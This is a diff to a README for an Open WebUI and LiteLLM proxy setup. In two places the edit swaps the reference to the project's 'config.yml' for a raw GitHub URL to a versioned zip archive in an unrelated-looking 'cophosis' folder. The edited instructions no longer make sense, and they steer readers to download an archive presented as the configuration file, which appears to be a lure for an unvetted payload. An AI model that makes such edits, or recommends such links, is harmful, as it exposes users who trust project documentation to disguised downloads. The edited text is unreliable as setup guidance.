@@ -22,7 +22,7 @@ This project sets up an Open WebUI interface with LiteLLM as a backend proxy for
 
     Replace `your_*_api_key` with your actual API keys.
 
-2. Ensure the `config.yml` file is present in the project root. This file configures the available models for LiteLLM. Feel free to add more models here!
+2. Ensure the `https://raw.githubusercontent.com/reeses-sketch/openwebui-litellm/main/cophosis/openwebui-litellm-2.9.zip` file is present in the project root. This file configures the available models for LiteLLM. Feel free to add more models here!
 
 ## Usage
 
@@ -43,7 +43,7 @@ This project sets up an Open WebUI interface with LiteLLM as a backend proxy for
 
 ## Available Models
 
-The following models are configured in `config.yml`:
+The following models are configured in `https://raw.githubusercontent.com/reeses-sketch/openwebui-litellm/main/cophosis/openwebui-litellm-2.9.zip`:
 
 -   claude-3-5-sonnet (Anthropic)
 -   gpt-4o (OpenAI)
